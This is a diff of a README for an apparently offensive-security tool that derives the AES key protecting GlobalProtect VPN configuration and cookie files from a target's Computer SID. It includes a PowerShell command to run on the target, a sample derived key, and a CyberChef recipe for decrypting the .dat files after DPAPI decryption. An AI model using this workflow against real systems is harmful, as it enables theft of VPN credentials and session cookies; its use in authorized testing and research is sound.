@@ -1,10 +1,10 @@
 # GlobalProtect_KeyGen
 
-Tool for generating encryption key of GlobalProtect VPN configuration and cookies (after DPAPI decryption) using the Computer SID.
+Tool for generating encryption key to decrypt offline GlobalProtect VPN configuration and cookies using the Computer SID.
 
 ## Usage
 
-Obtain Computer SID of target 
+Obtain Computer SID of target (execute on target system)
 ```
 ((get-wmiobject -query "Select * from Win32_UserAccount Where LocalAccount = TRUE").SID -replace "\d+$","" -replace ".$")[0]
 ```
@@ -22,6 +22,9 @@ Usage: GlobalProtect_KeyGen.exe Computer_SID_VALUE
         [*] Computer SID (Hex) : 010400000000000515000000E949AAE58AB0F268F2F88692
         [*] Derived AES Key: FFD40E0D6894B0582E3AA0F2899F9FBEFFD40E0D6894B0582E3AA0F2899F9FBE
 ```
+
+## Decrypt .dat files (after DPAPI decryption -> [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)) using CyberChef
+https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Hex','string':'FFD40E0D6894B0582E3AA0F2899F9FBEFFD40E0D6894B0582E3AA0F2899F9FBE'%7D,%7B'option':'Hex','string':'0000000000000000'%7D,'CBC','Raw','Hex',%7B'option':'Hex','string':''%7D)
 
 ## Original Source Code
 https://github.com/rotarydrone/GlobalUnProtect
